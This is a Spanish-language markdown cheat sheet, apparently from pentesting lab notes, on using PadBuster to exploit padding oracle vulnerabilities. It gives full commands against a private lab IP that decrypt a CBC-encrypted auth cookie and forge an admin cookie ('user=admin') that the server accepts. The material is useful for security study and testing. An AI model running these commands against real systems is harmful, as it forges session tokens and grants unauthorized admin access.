# PadBuster

PadBuster es una herramienta para explotar vulnerabilidades de **Padding Oracle**. Permite descifrar cookies o tokens cifrados con CBC y, una vez conocido el texto plano, forjar nuevos valores cifrados (p.ej. cambiar `user=bendu` por `user=admin`).

---

## Sintaxis

```bash
padbuster <URL> <EncryptedSample> <BlockSize> [opciones]
```

El tamaño de bloque habitual es `8` (DES/3DES) o `16` (AES).

---

## Descifrar una cookie

```bash
padbuster http://192.168.1.17/index.php \
  3U45ZrgkKaW3wGiEwijfk32p72vwyKOH \
  8 \
  -cookies 'auth=3U45ZrgkKaW3wGiEwijfk32p72vwyKOH'
```

Salida esperada:

```
[+] Decrypted value (ASCII): user=bendu
[+] Decrypted value (HEX):   757365723D62656E6475060606060606
[+] Decrypted value (Base64): dXNlcj1iZW5kdQYGBgYGBg==
```

---

## Forjar un nuevo valor cifrado

Una vez conocido el formato del texto plano, se puede cifrar un valor arbitrario:

```bash
padbuster http://192.168.1.17/index.php \
  3U45ZrgkKaW3wGiEwijfk32p72vwyKOH \
  8 \
  -cookies 'auth=3U45ZrgkKaW3wGiEwijfk32p72vwyKOH' \
  -plaintext 'user=admin'
```

PadBuster devuelve una cookie cifrada con el valor `user=admin` que el servidor aceptará como válida.

---

## Ver también

- [Padding Oracle Attack](../03-explotacion-web/padding-oracle.md) — Explicación teórica y explotación manual
